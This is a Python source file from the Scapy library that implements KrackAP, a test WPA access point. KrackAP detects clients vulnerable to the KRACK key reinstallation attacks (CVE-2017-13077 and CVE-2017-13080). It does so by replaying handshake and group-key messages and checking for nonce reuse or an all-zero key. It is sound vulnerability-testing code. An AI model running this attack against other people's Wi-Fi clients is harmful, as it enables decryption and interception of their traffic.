# SPDX-License-Identifier: GPL-2.0-only
# This file is part of Scapy
# See https://scapy.net/ for more information

import hmac
import hashlib
from itertools import count
import struct
import time

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from scapy.automaton import ATMT, Automaton
from scapy.base_classes import Net
from scapy.config import conf
from scapy.compat import raw, chb
from scapy.consts import LINUX
from scapy.error import log_runtime
from scapy.layers.dot11 import (
    AKMSuite,
    Dot11,
    Dot11AssoReq,
    Dot11AssoResp,
    Dot11Auth,
    Dot11Beacon,
    Dot11Elt,
    Dot11EltDSSSet,
    Dot11EltRSN,
    Dot11EltRates,
    Dot11ProbeReq,
    Dot11ProbeResp,
    RSNCipherSuite,
    RadioTap,
)
from scapy.layers.eap import EAPOL
from scapy.layers.l2 import ARP, LLC, SNAP, Ether
from scapy.layers.dhcp import DHCP_am
from scapy.packet import Raw
from scapy.utils import hexdump, mac2str
from scapy.volatile import RandBin


from scapy.modules.krack.crypto import parse_data_pkt, parse_TKIP_hdr, \
    build_TKIP_payload, check_MIC_ICV, MICError, ICVError, build_MIC_ICV, \
    customPRF512, ARC4_encrypt


class DHCPOverWPA(DHCP_am):
    """Wrapper over DHCP_am to send and recv inside a WPA channel"""

    def __init__(self, send_func, *args, **kwargs):
        super(DHCPOverWPA, self).__init__(*args, **kwargs)
        self.send_function = send_func

    def sniff(self, *args, **kwargs):
        # Do not sniff, use a direct call to 'replay(pkt)' instead
        return


class KrackAP(Automaton):
    """Tiny WPA AP for detecting client vulnerable to KRACK attacks defined in:
    "Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2"

    Example of use:
    KrackAP(
        iface="mon0",               # A monitor interface
        ap_mac='11:22:33:44:55:66', # MAC to use
        ssid="TEST_KRACK",          # SSID
        passphrase="testtest",      # Associated passphrase
    ).run()

    Then, on the target device, connect to "TEST_KRACK" using "testtest" as the
    passphrase.
    The output logs will indicate if one of the CVE have been triggered.
    """

    # Number of "GTK rekeying -> ARP replay" attempts. The vulnerability may not  # noqa: E501
    # be detected the first time. Several attempt implies the client has been
    # likely patched
    ARP_MAX_RETRY = 50

    def __init__(self, *args, **kargs):
        kargs.setdefault("ll", conf.L2socket)
        if not LINUX:
            kargs.setdefault("monitor", True)
        super(KrackAP, self).__init__(*args, **kargs)

    def parse_args(self, ap_mac, ssid, passphrase,
                   channel=None,
                   # KRACK attack options
                   double_3handshake=True,
                   encrypt_3handshake=True,
                   wait_3handshake=0,
                   double_gtk_refresh=True,
                   arp_target_ip=None,
                   arp_source_ip=None,
                   wait_gtk=10,
                   **kwargs):
        """
        Mandatory arguments:

        :param iface: interface to use (must be in monitor mode)
        :param ap_mac: AP's MAC
        :param ssid: AP's SSID
        :param passphrase: AP's Passphrase (min 8 char.)

        Optional arguments:

        :param channel: used by the interface. Default 6

        Krack attacks options:

         - Msg 3/4 handshake replay:

        :param double_3handshake: double the 3/4 handshake message
        :param encrypt_3handshake: encrypt the second 3/4 handshake message
        :param wait_3handshake: time to wait (in sec.) before sending the
            second 3/4

        - double GTK rekeying:

        :param double_gtk_refresh: double the 1/2 GTK rekeying message
        :param wait_gtk: time to wait (in sec.) before sending the GTK rekeying
        :param arp_target_ip: Client IP to use in ARP req. (to detect attack
            success). If None, use a DHCP server
        :param arp_source_ip: Server IP to use in ARP req. (to detect attack
            success). If None, use the DHCP server gateway address
        """
        super(KrackAP, self).parse_args(**kwargs)

        # Main AP options
        self.mac = ap_mac
        self.ssid = ssid
        self.passphrase = passphrase
        if channel is None:
            channel = 6
        self.channel = channel

        # Internal structures
        self.last_iv = None
        self.client = None
        self.seq_num = count()
        self.replay_counter = count()
        self.time_handshake_end = None
        self.dhcp_server = DHCPOverWPA(send_func=self.send_ether_over_wpa,
                                       pool=Net("192.168.42.128/25"),
                                       network="192.168.42.0/24",
                                       gw="192.168.42.1")
        self.arp_sent = []
        self.arp_to_send = 0
        self.arp_retry = 0

        # Bit 0: 3way handshake sent
        # Bit 1: GTK rekeying sent
        # Bit 2: ARP response obtained
        self.krack_state = 0

        # Krack options
        self.double_3handshake = double_3handshake
        self.encrypt_3handshake = encrypt_3handshake
        self.wait_3handshake = wait_3handshake
        self.double_gtk_refresh = double_gtk_refresh
        self.arp_target_ip = arp_target_ip
        if arp_source_ip is None:
            # Use the DHCP server Gateway address
            arp_source_ip = self.dhcp_server.gw
        self.arp_source_ip = arp_source_ip
        self.wait_gtk = wait_gtk

        # May take several seconds
        self.install_PMK()

    def run(self, *args, **kwargs):
        log_runtime.warning("AP started with ESSID: %s, BSSID: %s",
                            self.ssid, self.mac)
        super(KrackAP, self).run(*args, **kwargs)

    # Key utils

    @staticmethod
    def gen_nonce(size):
        """Return a nonce of @size element of random bytes as a string"""
        return raw(RandBin(size))

    def install_PMK(self):
        """Compute and install the PMK"""
        self.pmk = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=32,
            salt=self.ssid.encode(),
            iterations=4096,
            backend=default_backend(),
        ).derive(self.passphrase.encode())

    def install_unicast_keys(self, client_nonce):
        """Use the client nonce @client_nonce to compute and install
        PTK, KCK, KEK, TK, MIC (AP -> STA), MIC (STA -> AP)
        """
        pmk = self.pmk
        anonce = self.anonce
        snonce = client_nonce
        amac = mac2str(self.mac)
        smac = mac2str(self.client)

        # Compute PTK
        self.ptk = customPRF512(pmk, amac, smac, anonce, snonce)

        # Extract derivated keys
        self.kck = self.ptk[:16]
        self.kek = self.ptk[16:32]
        self.tk = self.ptk[32:48]
        self.mic_ap_to_sta = self.ptk[48:56]
        self.mic_sta_to_ap = self.ptk[56:64]

        # Reset IV
        self.client_iv = count()

    def install_GTK(self):
        """Compute a new GTK and install it alongs
        MIC (AP -> Group = broadcast + multicast)
        """

        # Compute GTK
        self.gtk_full = self.gen_nonce(32)
        self.gtk = self.gtk_full[:16]

        # Extract derivated keys
        self.mic_ap_to_group = self.gtk_full[16:24]

        # Reset IV
        self.group_iv = count()

    # Packet utils

    def build_ap_info_pkt(self, layer_cls, dest):
        """Build a packet with info describing the current AP
        For beacon / proberesp use
        """
        ts = int(time.time() * 1e6) & 0xffffffffffffffff
        return RadioTap() \
            / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
            / layer_cls(timestamp=ts, beacon_interval=100,
                        cap='ESS+privacy') \
            / Dot11Elt(ID="SSID", info=self.ssid) \
            / Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36]) \
            / Dot11EltDSSSet(channel=self.channel) \
            / Dot11EltRSN(group_cipher_suite=RSNCipherSuite(cipher=0x2),
                          pairwise_cipher_suites=[RSNCipherSuite(cipher=0x2)],
                          akm_suites=[AKMSuite(suite=0x2)])

    @staticmethod
    def build_EAPOL_Key_8021X2004(
            key_information,
            replay_counter,
            nonce,
            data=None,
            key_mic=None,
            key_data_encrypt=None,
            key_rsc=0,
            key_id=0,
            key_descriptor_type=2,  # EAPOL RSN Key
    ):
        pkt = EAPOL(version="802.1X-2004", type="EAPOL-Key")

        key_iv = KrackAP.gen_nonce(16)

        assert key_rsc == 0  # Other values unsupported
        assert key_id == 0  # Other values unsupported
        payload = b"".join([
            chb(key_descriptor_type),
            struct.pack(">H", key_information),
            b'\x00\x20',  # Key length
            struct.pack(">Q", replay_counter),
            nonce,
            key_iv,
            struct.pack(">Q", key_rsc),
            struct.pack(">Q", key_id),
        ])

        # MIC field is set to 0's during MIC computation
        offset_MIC = len(payload)
        payload += b'\x00' * 0x10

        if data is None and key_mic is None and key_data_encrypt is None:
            # If key is unknown and there is no data, no MIC is needed
            # Example: handshake 1/4
            payload += b'\x00' * 2  # Length
            return pkt / Raw(load=payload)

        assert data is not None
        assert key_mic is not None
        assert key_data_encrypt is not None

        # Skip 256 first bytes
        # REF: 802.11i 8.5.2
        # Key Descriptor Version 1:
        # ...
        # No padding shall be used. The encryption key is generated by
        # concatenating the EAPOL-Key IV field and the KEK. The first 256 octets  # noqa: E501
        # of the RC4 key stream shall be discarded following RC4 stream cipher
        # initialization with the KEK, and encryption begins using the 257th key  # noqa: E501
        # stream octet.
        enc_data = ARC4_encrypt(key_iv + key_data_encrypt, data, skip=256)

        payload += struct.pack(">H", len(data))
        payload += enc_data

        # Compute MIC and set at the right place
        temp_mic = pkt.copy()
        temp_mic /= Raw(load=payload)
        to_mic = raw(temp_mic[EAPOL])
        mic = hmac.new(key_mic, to_mic, hashlib.md5).digest()
        final_payload = payload[:offset_MIC] + mic + payload[offset_MIC + len(mic):]  # noqa: E501
        assert len(final_payload) == len(payload)

        return pkt / Raw(load=final_payload)

    def build_GTK_KDE(self):
        """Build the Key Data Encapsulation for GTK
        KeyID: 0
        Ref: 802.11i p81
        """
        return b''.join([
            b'\xdd',  # Type KDE
            chb(len(self.gtk_full) + 6),
            b'\x00\x0f\xac',  # OUI
            b'\x01',  # GTK KDE
            b'\x00\x00',  # KeyID - Tx - Reserved x2
            self.gtk_full,
        ])

    def send_wpa_enc(self, data, iv, seqnum, dest, mic_key,
                     key_idx=0, additionnal_flag=["from-DS"],
                     encrypt_key=None):
        """Send an encrypted packet with content @data, using IV @iv,
        sequence number @seqnum, MIC key @mic_key
        """

        if encrypt_key is None:
            encrypt_key = self.tk

        rep = RadioTap()
        rep /= Dot11(
            addr1=dest,
            addr2=self.mac,
            addr3=self.mac,
            FCfield="+".join(['protected'] + additionnal_flag),
            SC=(next(self.seq_num) << 4),
            subtype=0,
            type="Data",
        )

        # Assume packet is send by our AP -> use self.mac as source

        # Encapsule in TKIP with MIC Michael and ICV
        data_to_enc = build_MIC_ICV(raw(data), mic_key, self.mac, dest)

        # Header TKIP + payload
        rep /= Raw(build_TKIP_payload(data_to_enc, iv, self.mac, encrypt_key))

        self.send(rep)
        return rep

    def send_wpa_to_client(self, data, **kwargs):
        kwargs.setdefault("encrypt_key", self.tk)
        return self.send_wpa_enc(data, next(self.client_iv),
                                 next(self.seq_num), self.client,
                                 self.mic_ap_to_sta, **kwargs)

    def send_wpa_to_group(self, data, dest="ff:ff:ff:ff:ff:ff", **kwargs):
        kwargs.setdefault("encrypt_key", self.gtk)
        return self.send_wpa_enc(data, next(self.group_iv),
                                 next(self.seq_num), dest,
                                 self.mic_ap_to_group, **kwargs)

    def send_ether_over_wpa(self, pkt, **kwargs):
        """Send an Ethernet packet using the WPA channel
        Extra arguments will be ignored, and are just left for compatibility
        """

        payload = LLC() / SNAP() / pkt[Ether].payload
        dest = pkt.dst
        if dest == "ff:ff:ff:ff:ff:ff":
            self.send_wpa_to_group(payload, dest)
        else:
            assert dest == self.client
            self.send_wpa_to_client(payload)

    def deal_common_pkt(self, pkt):
        # Send to DHCP server
        # LLC / SNAP to Ether
        if SNAP in pkt:
            ether_pkt = Ether(src=self.client, dst=self.mac) / pkt[SNAP].payload  # noqa: E501
            self.dhcp_server.reply(ether_pkt)

        # If an ARP request is made, extract client IP and answer
        if ARP in pkt and \
           pkt[ARP].op == 1 and pkt[ARP].pdst == self.dhcp_server.gw:
            if self.arp_target_ip is None:
                self.arp_target_ip = pkt[ARP].psrc
                log_runtime.info("Detected IP: %s", self.arp_target_ip)

            # Reply
            ARP_ans = LLC() / SNAP() / ARP(
                op="is-at",
                psrc=self.arp_source_ip,
                pdst=self.arp_target_ip,
                hwsrc=self.mac,
                hwdst=self.client,
            )
            self.send_wpa_to_client(ARP_ans)

    # States

    @ATMT.state(initial=True)
    def WAIT_AUTH_REQUEST(self):
        log_runtime.debug("State WAIT_AUTH_REQUEST")

    @ATMT.state()
    def AUTH_RESPONSE_SENT(self):
        log_runtime.debug("State AUTH_RESPONSE_SENT")

    @ATMT.state()
    def ASSOC_RESPONSE_SENT(self):
        log_runtime.debug("State ASSOC_RESPONSE_SENT")

    @ATMT.state()
    def WPA_HANDSHAKE_STEP_1_SENT(self):
        log_runtime.debug("State WPA_HANDSHAKE_STEP_1_SENT")

    @ATMT.state()
    def WPA_HANDSHAKE_STEP_3_SENT(self):
        log_runtime.debug("State WPA_HANDSHAKE_STEP_3_SENT")

    @ATMT.state()
    def KRACK_DISPATCHER(self):
        log_runtime.debug("State KRACK_DISPATCHER")

    @ATMT.state()
    def ANALYZE_DATA(self):
        log_runtime.debug("State ANALYZE_DATA")

    @ATMT.timeout(ANALYZE_DATA, 1)
    def timeout_analyze_data(self):
        raise self.KRACK_DISPATCHER()

    @ATMT.state()
    def RENEW_GTK(self):
        log_runtime.debug("State RENEW_GTK")

    @ATMT.state()
    def WAIT_GTK_ACCEPT(self):
        log_runtime.debug("State WAIT_GTK_ACCEPT")

    @ATMT.state()
    def WAIT_ARP_REPLIES(self):
        log_runtime.debug("State WAIT_ARP_REPLIES")

    @ATMT.state(final=1)
    def EXIT(self):
        log_runtime.debug("State EXIT")

    @ATMT.timeout(WAIT_GTK_ACCEPT, 1)
    def timeout_wait_gtk_accept(self):
        raise self.RENEW_GTK()

    @ATMT.timeout(WAIT_AUTH_REQUEST, 0.1)
    def timeout_waiting(self):
        raise self.WAIT_AUTH_REQUEST()

    @ATMT.action(timeout_waiting)
    def send_beacon(self):
        log_runtime.debug("Send a beacon")
        rep = self.build_ap_info_pkt(Dot11Beacon, dest="ff:ff:ff:ff:ff:ff")
        self.send(rep)

    @ATMT.receive_condition(WAIT_AUTH_REQUEST)
    def probe_request_received(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return
        if Dot11ProbeReq in pkt and pkt[Dot11Elt::{'ID': 0}].info == self.ssid:
            raise self.WAIT_AUTH_REQUEST().action_parameters(pkt)

    @ATMT.action(probe_request_received)
    def send_probe_response(self, pkt):
        rep = self.build_ap_info_pkt(Dot11ProbeResp, dest=pkt.addr2)
        self.send(rep)

    @ATMT.receive_condition(WAIT_AUTH_REQUEST)
    def authent_received(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return
        if Dot11Auth in pkt and pkt.addr1 == pkt.addr3 == self.mac:
            raise self.AUTH_RESPONSE_SENT().action_parameters(pkt)

    @ATMT.action(authent_received)
    def send_auth_response(self, pkt):

        # Save client MAC for later
        self.client = pkt.addr2
        log_runtime.warning("Client %s connected!", self.client)

        # Launch DHCP Server
        self.dhcp_server()

        rep = RadioTap()
        rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
        rep /= Dot11Auth(seqnum=2, algo=pkt[Dot11Auth].algo,
                         status=pkt[Dot11Auth].status)

        self.send(rep)

    @ATMT.receive_condition(AUTH_RESPONSE_SENT)
    def assoc_received(self, pkt):
        if Dot11AssoReq in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
           pkt[Dot11Elt::{'ID': 0}].info == self.ssid:
            raise self.ASSOC_RESPONSE_SENT().action_parameters(pkt)

    @ATMT.action(assoc_received)
    def send_assoc_response(self, pkt):

        # Get RSN info
        temp_pkt = pkt[Dot11Elt::{"ID": 48}].copy()
        temp_pkt.remove_payload()
        self.RSN = raw(temp_pkt)
        # Avoid 802.11w, etc. (deactivate RSN capabilities)
        self.RSN = self.RSN[:-2] + b"\x00\x00"

        rep = RadioTap()
        rep /= Dot11(addr1=self.client, addr2=self.mac, addr3=self.mac)
        rep /= Dot11AssoResp()
        rep /= Dot11EltRates(rates=[130, 132, 139, 150, 12, 18, 24, 36])

        self.send(rep)

    @ATMT.condition(ASSOC_RESPONSE_SENT)
    def assoc_sent(self):
        raise self.WPA_HANDSHAKE_STEP_1_SENT()

    @ATMT.action(assoc_sent)
    def send_wpa_handshake_1(self):

        self.anonce = self.gen_nonce(32)

        rep = RadioTap()
        rep /= Dot11(
            addr1=self.client,
            addr2=self.mac,
            addr3=self.mac,
            FCfield='from-DS',
            SC=(next(self.seq_num) << 4),
        )
        rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication
        rep /= self.build_EAPOL_Key_8021X2004(
            key_information=0x89,
            replay_counter=next(self.replay_counter),
            nonce=self.anonce,
        )

        self.send(rep)

    @ATMT.receive_condition(WPA_HANDSHAKE_STEP_1_SENT)
    def wpa_handshake_1_sent(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return
        if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
           pkt[EAPOL].load[1:2] == b"\x01":
            # Key MIC: set, Secure / Error / Request / Encrypted / SMK
            # message: not set
            raise self.WPA_HANDSHAKE_STEP_3_SENT().action_parameters(pkt)

    @ATMT.action(wpa_handshake_1_sent)
    def send_wpa_handshake_3(self, pkt):

        # Both nonce have been exchanged, install keys
        client_nonce = pkt[EAPOL].load[13:13 + 0x20]
        self.install_unicast_keys(client_nonce)

        # Check client MIC

        # Data: full message with MIC place replaced by 0s
        # https://stackoverflow.com/questions/15133797/creating-wpa-message-integrity-code-mic-with-python
        client_mic = pkt[EAPOL].load[77:77 + 16]
        client_data = raw(pkt[EAPOL]).replace(client_mic, b"\x00" * len(client_mic))  # noqa: E501
        assert hmac.new(self.kck, client_data, hashlib.md5).digest() == client_mic  # noqa: E501

        rep = RadioTap()
        rep /= Dot11(
            addr1=self.client,
            addr2=self.mac,
            addr3=self.mac,
            FCfield='from-DS',
            SC=(next(self.seq_num) << 4),
        )

        rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication

        self.install_GTK()
        data = self.RSN
        data += self.build_GTK_KDE()

        eap = self.build_EAPOL_Key_8021X2004(
            key_information=0x13c9,
            replay_counter=next(self.replay_counter),
            nonce=self.anonce,
            data=data,
            key_mic=self.kck,
            key_data_encrypt=self.kek,
        )

        self.send(rep / eap)

    @ATMT.receive_condition(WPA_HANDSHAKE_STEP_3_SENT)
    def wpa_handshake_3_sent(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return
        if EAPOL in pkt and pkt.addr1 == pkt.addr3 == self.mac and \
           pkt[EAPOL].load[1:3] == b"\x03\x09":
            self.time_handshake_end = time.time()
            raise self.KRACK_DISPATCHER()

    @ATMT.condition(KRACK_DISPATCHER)
    def krack_dispatch(self):
        now = time.time()
        # Handshake 3/4 replay
        if self.double_3handshake and (self.krack_state & 1 == 0) and \
           (now - self.time_handshake_end) > self.wait_3handshake:
            log_runtime.info("Trying to trigger CVE-2017-13077")
            raise self.ANALYZE_DATA().action_parameters(send_3handshake=True)

        # GTK rekeying
        if (self.krack_state & 2 == 0) and \
           (now - self.time_handshake_end) > self.wait_gtk:
            raise self.ANALYZE_DATA().action_parameters(send_gtk=True)

        # Fallback in data analysis
        raise self.ANALYZE_DATA().action_parameters()

    @ATMT.action(krack_dispatch)
    def krack_proceed(self, send_3handshake=False, send_gtk=False):
        if send_3handshake:
            rep = RadioTap()
            rep /= Dot11(
                addr1=self.client,
                addr2=self.mac,
                addr3=self.mac,
                FCfield='from-DS',
                SC=(next(self.seq_num) << 4),
                subtype=0,
                type="Data",
            )

            rep /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
            rep /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication

            data = self.RSN
            data += self.build_GTK_KDE()

            eap_2 = self.build_EAPOL_Key_8021X2004(
                # Key information 0x13c9:
                #   ARC4 HMAC-MD5, Pairwise Key, Install, KEY ACK, KEY MIC, Secure,  # noqa: E501
                #   Encrypted, SMK
                key_information=0x13c9,
                replay_counter=next(self.replay_counter),
                nonce=self.anonce,
                data=data,
                key_mic=self.kck,
                key_data_encrypt=self.kek,
            )

            rep /= eap_2

            if self.encrypt_3handshake:
                self.send_wpa_to_client(rep[LLC])
            else:
                self.send(rep)

            self.krack_state |= 1

        if send_gtk:
            self.krack_state |= 2
            # Renew the GTK
            self.install_GTK()
            raise self.RENEW_GTK()

    @ATMT.receive_condition(ANALYZE_DATA)
    def get_data(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return

        # Skip retries
        if pkt[Dot11].FCfield.retry:
            return

        # Skip unencrypted frames (TKIP rely on encrypted packets)
        if not pkt[Dot11].FCfield.protected:
            return

        # Dot11.type 2: Data
        if pkt.type == 2 and Raw in pkt and pkt.addr1 == self.mac:
            # Do not check pkt.addr3, frame can be broadcast
            raise self.KRACK_DISPATCHER().action_parameters(pkt)

    @ATMT.action(get_data)
    def extract_iv(self, pkt):
        # Get IV
        TSC, _, _ = parse_TKIP_hdr(pkt)
        iv = TSC[0] | (TSC[1] << 8) | (TSC[2] << 16) | (TSC[3] << 24) | \
            (TSC[4] << 32) | (TSC[5] << 40)
        log_runtime.info("Got a packet with IV: %s", hex(iv))

        if self.last_iv is None:
            self.last_iv = iv
        else:
            if iv <= self.last_iv:
                log_runtime.warning("IV reuse!! Client seems to be "
                                    "vulnerable to handshake 3/4 replay "
                                    "(CVE-2017-13077)"
                                    )

        data_clear = None

        # Normal decoding
        data = parse_data_pkt(pkt, self.tk)
        try:
            data_clear = check_MIC_ICV(data, self.mic_sta_to_ap, pkt.addr2,
                                       pkt.addr3)
        except (ICVError, MICError):
            pass

        # Decoding with a 0's TK
        if data_clear is None:
            data = parse_data_pkt(pkt, b"\x00" * len(self.tk))
            try:
                mic_key = b"\x00" * len(self.mic_sta_to_ap)
                data_clear = check_MIC_ICV(data, mic_key, pkt.addr2, pkt.addr3)
                log_runtime.warning("Client has installed an all zero "
                                    "encryption key (TK)!!")
            except (ICVError, MICError):
                pass

        if data_clear is None:
            log_runtime.warning("Unable to decode the packet, something went "
                                "wrong")
            log_runtime.debug(hexdump(pkt, dump=True))
            self.deal_common_pkt(pkt)
            return

        log_runtime.debug(hexdump(data_clear, dump=True))
        pkt = LLC(data_clear)
        log_runtime.debug(repr(pkt))
        self.deal_common_pkt(pkt)

    @ATMT.condition(RENEW_GTK)
    def gtk_pkt_1(self):
        raise self.WAIT_GTK_ACCEPT()

    @ATMT.action(gtk_pkt_1)
    def send_renew_gtk(self):

        rep_to_enc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
        rep_to_enc /= SNAP(OUI=0, code=0x888e)  # 802.1X Authentication

        data = self.build_GTK_KDE()

        eap = self.build_EAPOL_Key_8021X2004(
            # Key information 0x1381:
            #   ARC4 HMAC-MD5, Group Key, KEY ACK, KEY MIC, Secure, Encrypted,
            #   SMK
            key_information=0x1381,
            replay_counter=next(self.replay_counter),
            nonce=self.anonce,
            data=data,
            key_mic=self.kck,
            key_data_encrypt=self.kek,
        )

        rep_to_enc /= eap
        self.send_wpa_to_client(rep_to_enc)

    @ATMT.receive_condition(WAIT_GTK_ACCEPT)
    def get_gtk_2(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return

        # Skip retries
        if pkt[Dot11].FCfield.retry:
            return

        # Skip unencrypted frames (TKIP rely on encrypted packets)
        if not pkt[Dot11].FCfield.protected:
            return

        # Normal decoding
        try:
            data = parse_data_pkt(pkt, self.tk)
        except ValueError:
            return
        try:
            data_clear = check_MIC_ICV(data, self.mic_sta_to_ap, pkt.addr2,
                                       pkt.addr3)
        except (ICVError, MICError):
            return

        pkt_clear = LLC(data_clear)
        if EAPOL in pkt_clear and pkt.addr1 == pkt.addr3 == self.mac and \
           pkt_clear[EAPOL].load[1:3] == b"\x03\x01":
            raise self.WAIT_ARP_REPLIES()

    @ATMT.action(get_gtk_2)
    def send_arp_req(self):

        if self.krack_state & 4 == 0:
            # Set the address for future uses
            self.arp_target_ip = self.dhcp_server.leases.get(self.client,
                                                             self.arp_target_ip)  # noqa: E501
            assert self.arp_target_ip is not None

            # Send the first ARP requests, for control test
            log_runtime.info("Send ARP who-was from '%s' to '%s'",
                             self.arp_source_ip,
                             self.arp_target_ip)
            arp_pkt = self.send_wpa_to_group(
                LLC() / SNAP() / ARP(op="who-has",
                                     psrc=self.arp_source_ip,
                                     pdst=self.arp_target_ip,
                                     hwsrc=self.mac),
                dest='ff:ff:ff:ff:ff:ff',
            )
            self.arp_sent.append(arp_pkt)
        else:
            if self.arp_to_send < len(self.arp_sent):
                # Re-send the ARP requests already sent
                self.send(self.arp_sent[self.arp_to_send])
                self.arp_to_send += 1
            else:
                # Re-send GTK
                self.arp_to_send = 0
                self.arp_retry += 1
                log_runtime.info("Trying to trigger CVE-2017-13080 %d/%d",
                                 self.arp_retry, self.ARP_MAX_RETRY)
                if self.arp_retry > self.ARP_MAX_RETRY:
                    # We retries 100 times to send GTK, then already sent ARPs
                    log_runtime.warning("Client is likely not vulnerable to "
                                        "CVE-2017-13080")
                    raise self.EXIT()

                raise self.RENEW_GTK()

    @ATMT.timeout(WAIT_ARP_REPLIES, 0.5)
    def resend_arp_req(self):
        self.send_arp_req()
        raise self.WAIT_ARP_REPLIES()

    @ATMT.receive_condition(WAIT_ARP_REPLIES)
    def get_arp(self, pkt):
        # Avoid packet from other interfaces
        if RadioTap not in pkt:
            return

        # Skip retries
        if pkt[Dot11].FCfield.retry:
            return

        # Skip unencrypted frames (TKIP rely on encrypted packets)
        if not pkt[Dot11].FCfield.protected:
            return

        # Dot11.type 2: Data
        if pkt.type == 2 and Raw in pkt and pkt.addr1 == self.mac:
            # Do not check pkt.addr3, frame can be broadcast
            raise self.WAIT_ARP_REPLIES().action_parameters(pkt)

    @ATMT.action(get_arp)
    def check_arp_reply(self, pkt):
        data = parse_data_pkt(pkt, self.tk)
        try:
            data_clear = check_MIC_ICV(data, self.mic_sta_to_ap, pkt.addr2,
                                       pkt.addr3)
        except (ICVError, MICError):
            return

        decoded_pkt = LLC(data_clear)
        log_runtime.debug(hexdump(decoded_pkt, dump=True))
        log_runtime.debug(repr(decoded_pkt))
        self.deal_common_pkt(decoded_pkt)
        if ARP not in decoded_pkt:
            return

        # ARP.op 2: is-at
        if decoded_pkt[ARP].op == 2 and \
           decoded_pkt[ARP].psrc == self.arp_target_ip and \
           decoded_pkt[ARP].pdst == self.arp_source_ip:
            # Got the expected ARP
            if self.krack_state & 4 == 0:
                # First time, normal behavior
                log_runtime.info("Got ARP reply, this is normal")
                self.krack_state |= 4
                log_runtime.info("Trying to trigger CVE-2017-13080")
                raise self.RENEW_GTK()
            else:
                # Second time, the packet has been accepted twice!
                log_runtime.warning("Broadcast packet accepted twice!! "
                                    "(CVE-2017-13080)")
